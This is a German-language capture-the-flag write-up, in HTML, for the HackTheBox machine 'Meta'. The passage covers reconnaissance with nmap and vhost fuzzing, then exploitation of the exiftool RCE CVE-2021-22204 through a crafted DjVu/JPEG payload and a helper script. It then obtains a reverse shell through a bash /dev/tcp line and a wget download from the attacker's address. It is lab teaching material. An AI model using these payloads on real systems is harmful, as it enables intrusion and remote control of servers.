@@ -1,0 +1,500 @@
+<!DOCTYPE html>
+<html lang="de-de">
+    
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="theme-color" content="dark">
+    <title>HackTheBox: Meta | xenophil90.github.io</title>
+    
+    <meta property="og:site_name" content="xenophil90" />
+    <meta property="og:title" content="HackTheBox: Meta | xenophil90.github.io"/>
+    <meta itemprop="name" content="HackTheBox: Meta | xenophil90.github.io" />
+    <meta name="twitter:title" content="HackTheBox: Meta | xenophil90.github.io" />
+    <meta name="application-name" content="HackTheBox: Meta | xenophil90.github.io" /><meta name="twitter:card" content="summary"/>
+
+    <meta name="description" content="Writeup der HackTheBox-Maschine Meta" />
+    <meta name="twitter:description" content="Writeup der HackTheBox-Maschine Meta "/>
+    <meta itemprop="description" content=" Writeup der HackTheBox-Maschine Meta "/>
+    <meta property="og:description" content=" Writeup der HackTheBox-Maschine Meta " />
+
+    
+
+
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    
+    <link rel="stylesheet" href="/sass/main.min.8e5845c8f6f5d48fe256a59fcf548c65590415af8e70e0dda32f6cba26f19f98.css">
+    <script defer language="javascript" type="text/javascript"  src="/js/throttle.js"></script>
+</head>
+    
+    <script>
+        (function() {
+            const colorSchemeKey = 'ThemeColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'ThemeColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.userColorScheme = 'dark';
+        } else {
+            document.documentElement.dataset.userColorScheme = 'light';
+        }
+    })();
+</script>
+
+
+    <body class="dark">
+        <nav class="navbar">
+    <div class="container">
+        <div class="flex">
+            <div>
+                <a class="brand" href="/">
+                    
+                    <span class="emoji">
+                        🦊
+                    </span>
+                    
+                    
+                    xenophil90.github.io
+                    </a>
+            </div>
+            <div class="flex">
+                
+                
+                <a href="/fotografie">Fotografie</a>
+                
+                
+                    <button id="dark-mode-button">
+                    <svg class="light" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" focusable="false" width="1em" height="1em" style="-ms-transform: rotate(360deg); -webkit-transform: rotate(360deg); transform: rotate(360deg);" preserveAspectRatio="xMidYMid meet" viewBox="0 0 36 36"><path fill="#FFD983" d="M30.312.776C32 19 20 32 .776 30.312c8.199 7.717 21.091 7.588 29.107-.429C37.9 21.867 38.03 8.975 30.312.776z"/><path d="M30.705 15.915a1.163 1.163 0 1 0 1.643 1.641a1.163 1.163 0 0 0-1.643-1.641zm-16.022 14.38a1.74 1.74 0 0 0 0 2.465a1.742 1.742 0 1 0 0-2.465zm13.968-2.147a2.904 2.904 0 0 1-4.108 0a2.902 2.902 0 0 1 0-4.107a2.902 2.902 0 0 1 4.108 0a2.902 2.902 0 0 1 0 4.107z" fill="#FFCC4D"/><rect x="0" y="0" width="36" height="36" fill="rgba(0, 0, 0, 0)" /></svg>
+                    <svg class="dark" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" focusable="false" width="1em" height="1em" style="-ms-transform: rotate(360deg); -webkit-transform: rotate(360deg); transform: rotate(360deg);" preserveAspectRatio="xMidYMid meet" viewBox="0 0 36 36"><path fill="#FFD983" d="M16 2s0-2 2-2s2 2 2 2v2s0 2-2 2s-2-2-2-2V2zm18 14s2 0 2 2s-2 2-2 2h-2s-2 0-2-2s2-2 2-2h2zM4 16s2 0 2 2s-2 2-2 2H2s-2 0-2-2s2-2 2-2h2zm5.121-8.707s1.414 1.414 0 2.828s-2.828 0-2.828 0L4.878 8.708s-1.414-1.414 0-2.829c1.415-1.414 2.829 0 2.829 0l1.414 1.414zm21 21s1.414 1.414 0 2.828s-2.828 0-2.828 0l-1.414-1.414s-1.414-1.414 0-2.828s2.828 0 2.828 0l1.414 1.414zm-.413-18.172s-1.414 1.414-2.828 0s0-2.828 0-2.828l1.414-1.414s1.414-1.414 2.828 0s0 2.828 0 2.828l-1.414 1.414zm-21 21s-1.414 1.414-2.828 0s0-2.828 0-2.828l1.414-1.414s1.414-1.414 2.828 0s0 2.828 0 2.828l-1.414 1.414zM16 32s0-2 2-2s2 2 2 2v2s0 2-2 2s-2-2-2-2v-2z"/><circle fill="#FFD983" cx="18" cy="18" r="10"/><rect x="0" y="0" width="36" height="36" fill="rgba(0, 0, 0, 0)" /></svg>
+                    </button>
+                
+            </div>
+            </div>
+    </div>
+</nav>
+
+        <main>
+            
+<div class="container">
+    <article>
+        <header class="article-header">
+            <div class="thumb">
+                <div>
+                    <h1>HackTheBox: Meta</h1>
+                    <div class="post-meta">
+                        <div>
+                            
+                            
+                            Von Phil Krämer | <time>24. Januar 2022</time>
+                            | 7 Minuten Lesezeit
+                        </div>
+                        <div class="tags">
+                            
+                            <a href="/tags/hackthebox/">Hackthebox</a>
+                            
+                            <a href="/tags/hacking/">Hacking</a>
+                            
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </header>
+    </article>
+
+    <div class="article-post">
+      
+      
+        <div class="toc-wrapper">
+          <input type="checkbox" id="tocToggle" checked>
+          <label for="tocToggle">Inhaltsverzeichnis</label>
+              <nav id="TableOfContents">
+  <ul>
+    <li><a href="#einleitung">Einleitung</a></li>
+    <li><a href="#initiale-erkundung">Initiale Erkundung</a>
+      <ul>
+        <li><a href="#webserver-artcorphtb">Webserver: artcorp.htb</a></li>
+        <li><a href="#webserver-weitere-virtuelle-hosts-finden">Webserver: Weitere virtuelle Hosts finden</a></li>
+        <li><a href="#webserver-dev01artcorphtb">Webserver: dev01.artcorp.htb</a></li>
+      </ul>
+    </li>
+    <li><a href="#exiftool-remote-code-execution">Exiftool Remote Code Execution</a>
+      <ul>
+        <li><a href="#proof-of-concept">Proof-of-Concept</a></li>
+        <li><a href="#exploit-skript">Exploit-Skript</a></li>
+        <li><a href="#reverse-shell-als-www-data">Reverse Shell als www-data</a></li>
+      </ul>
+    </li>
+    <li><a href="#erkundung-als-www-data">Erkundung als www-data</a>
+      <ul>
+        <li><a href="#laufende-prozesse-und-cronjobs">Laufende Prozesse und Cronjobs</a></li>
+      </ul>
+    </li>
+    <li><a href="#rechteausweitung-auf-thomas-imagemagick-exploit">Rechteausweitung auf thomas (ImageMagick-Exploit)</a></li>
+    <li><a href="#rechteausweitung-auf-root">Rechteausweitung auf root</a></li>
+    <li><a href="#zusammenfassung">Zusammenfassung</a></li>
+  </ul>
+</nav>
+        </div>
+    
+    <h2 id="einleitung">
+    <a href="#einleitung" class="anchor">
+        <svg class="icon" aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16">
+            <path fill-rule="evenodd"
+                d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z">
+            </path>
+        </svg>
+    </a>
+    Einleitung
+</h2>
+<p>Meta ist eine als <em>Medium</em> eingestufte Maschine auf HackTheBox. Sie wurde Ende Januar 2022 veröffentlicht. Um die Maschine zu hacken ist es notwendig eine Schwachstelle in <em>exiftool</em> auszunutzen. Anschließend muss eine Schwachstelle des Moduls <em>Mogrify</em> aus der ImageMagick-Werkzeugsammlung ausgenutzt werden, um nach der ersten Shell den nächsten Benutzeraccount zu übernehmen. Als letzter Schritt wird eine Schwachstelle der Konfiguration von <em>sudo</em> und <em>neofetech</em> ausgenutzt, um Root-Zugang zu erhalten.</p>
+<p><strong>Dieser Artikel beschreibt die Lösung der Maschine und damit gilt: Spoileralarm!</strong></p>
+<figure><img src="/img/htb-meta-1.png">
+</figure>
+
+<h2 id="initiale-erkundung">
+    <a href="#initiale-erkundung" class="anchor">
+        <svg class="icon" aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16">
+            <path fill-rule="evenodd"
+                d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z">
+            </path>
+        </svg>
+    </a>
+    Initiale Erkundung
+</h2>
+<p>Zunächst wird das System mithilfe von <code>nmap</code> gescannt. Um den Prozess zu vereinfachen, nutze ich dafür mein Skript mit dem Namen <code>fast-nmap</code><sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-01-23 14:57 CET
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.129.140.80
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.026s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to http://artcorp.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache
+</span></span><span class="line"><span class="cl">Warning: OSScan results may be unreliable because we could not find at least <span class="m">1</span> open and <span class="m">1</span> closed port
+</span></span><span class="line"><span class="cl">Aggressive OS guesses: Linux 4.15 - 5.6 <span class="o">(</span>95%<span class="o">)</span>, Linux 5.0 <span class="o">(</span>94%<span class="o">)</span>, Linux 5.4 <span class="o">(</span>94%<span class="o">)</span>, Linux 5.0 - 5.4 <span class="o">(</span>94%<span class="o">)</span>, Linux 5.3 - 5.4 <span class="o">(</span>94%<span class="o">)</span>, Linux 3.1 <span class="o">(</span>94%<span class="o">)</span>, Linux 3.2 <span class="o">(</span>94%<span class="o">)</span>, AXIS 210A or <span class="m">211</span> Network Camera <span class="o">(</span>Linux 2.6.17<span class="o">)</span> <span class="o">(</span>94%<span class="o">)</span>, Linux 2.6.32 <span class="o">(</span>94%<span class="o">)</span>, Linux 5.0 - 5.3 <span class="o">(</span>94%<span class="o">)</span>
+</span></span><span class="line"><span class="cl">No exact OS matches <span class="k">for</span> host <span class="o">(</span><span class="nb">test</span> conditions non-ideal<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Network Distance: <span class="m">2</span> hops
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">TRACEROUTE <span class="o">(</span>using port 443/tcp<span class="o">)</span>
+</span></span><span class="line"><span class="cl">HOP RTT      ADDRESS
+</span></span><span class="line"><span class="cl"><span class="m">1</span>   25.91 ms 10.10.14.1
+</span></span><span class="line"><span class="cl"><span class="m">2</span>   25.95 ms 10.129.140.80
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 37.68 seconds
+</span></span></code></pre></div><p>Es sind zwei Ports geöffnet: 22 (OpenSSH) und 80 (Apache Webserver). Üblicherweise gibt es in OpenSSH wenig zu holen, weshalb ein weiterer Blick auf den Webserver lohnt.</p>
+<p>Nmap zeigt insbesondere eine Weiterleitung auf <a href="http://artcorp.htb/" target="_blank" rel="noreferrer noopener">http://artcorp.htb/</a>. Dies muss dann in der <code>/etc/hosts</code>-Datei ergänzt werden.</p>
+<h3 id="webserver-artcorphtb">
+    <a href="#webserver-artcorphtb" class="anchor">
+        <svg class="icon" aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16">
+            <path fill-rule="evenodd"
+                d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z">
+            </path>
+        </svg>
+    </a>
+    Webserver: artcorp.htb
+</h3>
+<figure><img src="/img/htb-meta-2.png">
+</figure>
+
+<p>Die Seite an sich sieht unspektakulär aus. Es scheint sich bei ArtCorp um eine Firma zu handeln, die Software entwickelt. Insbesondere wird gerade das Werkzeug <em>MetaView</em> entwickelt, ist aber nirgends auf der Seite aufzufinden. Vielleicht gibt es einen Entwicklungs-Server?</p>
+<h3 id="webserver-weitere-virtuelle-hosts-finden">
+    <a href="#webserver-weitere-virtuelle-hosts-finden" class="anchor">
+        <svg class="icon" aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16">
+            <path fill-rule="evenodd"
+                d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z">
+            </path>
+        </svg>
+    </a>
+    Webserver: Weitere virtuelle Hosts finden
+</h3>
+<p>Um weitere virtuelle Hosts zu finden, können verschiedene Tools eingesetzt werden, u. a. <code>FFuF</code> und <code>gobuster</code>. Beide Wege führen zum Ziel!</p>
+<p>Die folgenden Code-Zeilen zeigen beide Wege auf.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u https://artcorp.htb -H <span class="s2">&#34;Host: FUZZ.artcorp.htb&#34;</span> -t <span class="m">200</span> -fl <span class="m">10</span> -mc <span class="m">200</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gobuster vhost -u http://artcorp.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+</span></span></code></pre></div><p>Ergebnis des Scans: Es gibt einen weiteren virtuellen Host auf dem Webserver: <code>dev01.artcorp.htb</code>. Dies muss in der <code>/etc/hosts</code>-Datei vermerkt werden und anschließend kann die Seite im Internetbrowser aufgerufen werden.</p>
+<h3 id="webserver-dev01artcorphtb">
+    <a href="#webserver-dev01artcorphtb" class="anchor">
+        <svg class="icon" aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16">
+            <path fill-rule="evenodd"
+                d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z">
+            </path>
+        </svg>
+    </a>
+    Webserver: dev01.artcorp.htb
+</h3>
+<p>Hinter der neu entdeckten Subdomain verbirgt sich die aktuelle Entwickler-Version von <em>MetaView</em>.</p>
+<figure><img src="/img/htb-meta-3.png">
+</figure>
+
+<p>Nach kurzem Test entpuppt sich die Funktionsfähigkeit wie folgt: Der Benutzer lädt ein Bild Über das Webformular hoch und <em>MetaView</em> liest die Exit-Daten des Bildes aus und gibt diese auf dem Bildschirm aus. Die Ausgabe gleicht der Ausgabe von <code>exiftool</code><sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup>.</p>
+<h2 id="exiftool-remote-code-execution">
+    <a href="#exiftool-remote-code-execution" class="anchor">
+        <svg class="icon" aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16">
+            <path fill-rule="evenodd"
+                d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z">
+            </path>
+        </svg>
+    </a>
+    Exiftool Remote Code Execution
+</h2>
+<p>Eine kurze Recherche ergibt, dass es eine RCE-Schwachstelle in <code>exiftool</code> gibt<sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup>. Die Schwachstelle hat die Nummer CVE-2021-22204<sup id="fnref:4"><a href="#fn:4" class="footnote-ref" role="doc-noteref">4</a></sup> erhalten. Ein Angreifer kann Schadende in einer Bild-Datei verstecken und ausführen. Der verlinkte Artikel beinhaltet eine Schritt-für-Schritt Anleitung mit Proof-of-Concept.</p>
+<h3 id="proof-of-concept">
+    <a href="#proof-of-concept" class="anchor">
+        <svg class="icon" aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16">
+            <path fill-rule="evenodd"
+                d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z">
+            </path>
+        </svg>
+    </a>
+    Proof-of-Concept
+</h3>
+<p>Um zu verifizieren, dass der Server diese Schwachstelle besitzt, werden die folgenden Befehle ausgeführt. Der Schad-Code wird in dem Bild mit dem Namen <code>meta.jpg</code> versteckt.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="o">(</span>metadata <span class="s2">&#34;\c</span><span class="si">${</span><span class="nv">system</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2">;&#34;</span><span class="o">)</span> &gt; payload
+</span></span><span class="line"><span class="cl">bzz payload payload.bzz
+</span></span><span class="line"><span class="cl">djvumake exploit.djvu <span class="nv">INFO</span><span class="o">=</span><span class="s1">&#39;1,1&#39;</span> <span class="nv">BGjp</span><span class="o">=</span>/dev/null <span class="nv">ANTz</span><span class="o">=</span>payload.bzz
+</span></span><span class="line"><span class="cl">exiftool -config configfile <span class="s1">&#39;-HasselbladExif&lt;=exploit.djvu&#39;</span> meta.jpg 
+</span></span></code></pre></div><p>Die <code>configfile</code> hat den folgenden Inhalt:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">%Image::ExifTool::UserDefined = (
+</span></span><span class="line"><span class="cl">    # All EXIF tags are added to the Main table, and WriteGroup is used to
+</span></span><span class="line"><span class="cl">    # specify where the tag is written (default is ExifIFD if not specified):
+</span></span><span class="line"><span class="cl">    &#39;Image::ExifTool::Exif::Main&#39; =&gt; {
+</span></span><span class="line"><span class="cl">        # Example 1.  EXIF:NewEXIFTag
+</span></span><span class="line"><span class="cl">        0xc51b =&gt; {
+</span></span><span class="line"><span class="cl">            Name =&gt; &#39;HasselbladExif&#39;,
+</span></span><span class="line"><span class="cl">            Writable =&gt; &#39;string&#39;,
+</span></span><span class="line"><span class="cl">            WriteGroup =&gt; &#39;IFD0&#39;,
+</span></span><span class="line"><span class="cl">        },
+</span></span><span class="line"><span class="cl">        # add more user-defined EXIF tags here...
+</span></span><span class="line"><span class="cl">    },
+</span></span><span class="line"><span class="cl">);
+</span></span><span class="line"><span class="cl">1; #end%
+</span></span></code></pre></div><p>Anschließend wird das Bild hochgeladen und die Ausgabe auf der Seite kontrolliert: Es hat funktioniert!</p>
+<figure><img src="/img/htb-meta-4.png">
+</figure>
+
+<h3 id="exploit-skript">
+    <a href="#exploit-skript" class="anchor">
+        <svg class="icon" aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16">
+            <path fill-rule="evenodd"
+                d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z">
+            </path>
+        </svg>
+    </a>
+    Exploit-Skript
+</h3>
+<p>Um die Ausnutzung des Exploits einfacher zu gestalten, habe ich ein kurzes Bash-Skript geschrieben, das die Erstellung eines mit Schad-Code behafteten Bildes teil-automatisiert.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-create_payload.sh" data-lang="create_payload.sh"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;Creating Exploit&#34;</span>
+</span></span><span class="line"><span class="cl">bzz payload payload.bzz
+</span></span><span class="line"><span class="cl">djvumake exploit.djvu <span class="nv">INFO</span><span class="o">=</span><span class="s1">&#39;1,1&#39;</span> <span class="nv">BGjp</span><span class="o">=</span>/dev/null <span class="nv">ANTz</span><span class="o">=</span>payload.bzz
+</span></span><span class="line"><span class="cl">exiftool -config configfile <span class="s1">&#39;-HasselbladExif&lt;=exploit.djvu&#39;</span> meta.jpg
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;Exploit Created. Tidying up...&#34;</span>
+</span></span><span class="line"><span class="cl">rm exploit.djvu
+</span></span><span class="line"><span class="cl">rm payload.bzz
+</span></span><span class="line"><span class="cl">mv meta.jpg meta_exploit.jpg
+</span></span><span class="line"><span class="cl">mv meta.jpg_original meta.jpg
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;Done&#34;</span>
+</span></span></code></pre></div><p>Die Datei <code>payload</code> kann einfach editiert werden. Anschließend wird das Skript ausgeführt, um den Schad-Code in das Bild einzufügen.</p>
+<h3 id="reverse-shell-als-www-data">
+    <a href="#reverse-shell-als-www-data" class="anchor">
+        <svg class="icon" aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16">
+            <path fill-rule="evenodd"
+                d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z">
+            </path>
+        </svg>
+    </a>
+    Reverse Shell als www-data
+</h3>
+<p>Um eine stabile Reverse Shell zu erhalten, musste ich ein wenig herum probieren. Der Weg, der letztlich erfolgreich war, ist der Folgende.</p>
+<p>Zunächst wird eine Datei mit dem Namen <code>rev.sh</code> erstellt, die den folgenden Inhalt hat:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rev.sh" data-lang="rev.sh"><span class="line"><span class="cl">bash -i &gt;<span class="p">&amp;</span> /dev/tcp/10.10.14.140/4444 0&gt;<span class="p">&amp;</span><span class="m">1</span>
+</span></span></code></pre></div><p>Anschließend wird die Datei auf den Server übertragen:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">(metadata &#34;\c${system(&#39;wget -O /tmp/rev.sh http://10.10.14.140/rev.sh&#39;)};&#34;)
+</span></span></code></pre></div><p>Im letzten Schritt wird die hochgeladene Datei auf dem Server ausgeführt, während ein <code>netcat</code>-Listener auf der Angreifer-Maschine läuft.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">(metadata &#34;\c${system(&#39;bash /tmp/rev.sh&#39;)};&#34;)
+</span></span></code></pre></div><p>Das Ergebnis ist eine Reverse Shell als <code>www-data</code>.</p>
+<figure><img src="/img/htb-meta-5.png">
+</figure>
+
+<h2 id="erkundung-als-www-data">
+    <a href="#erkundung-als-www-data" class="anchor">
+        <svg class="icon" aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16">
+            <path fill-rule="evenodd"
+                d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z">
+            </path>
+        </svg>
+    </a>
+    Erkundung als www-data
+</h2>
+<p><code>www-data</code> hat leider keine Rechte, um auf interessante Informationen auf dem System zuzugreifen. Um die User-Flag zu erhalten, müssen die Rechte weiter ausgeweitet werden.</p>
+<p>Ein Blick in die /etc/passwd` zeigt, dass es einen weiteren Benutzer namens Thomas auf dem System gibt. In dessen Home-Verzeichnis liegt die User-Flag.</p>
+<h3 id="laufende-prozesse-und-cronjobs">
+    <a href="#laufende-prozesse-und-cronjobs" class="anchor">
+        <svg class="icon" aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16">
+            <path fill-rule="evenodd"
+                d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z">
+            </path>
+        </svg>
+    </a>
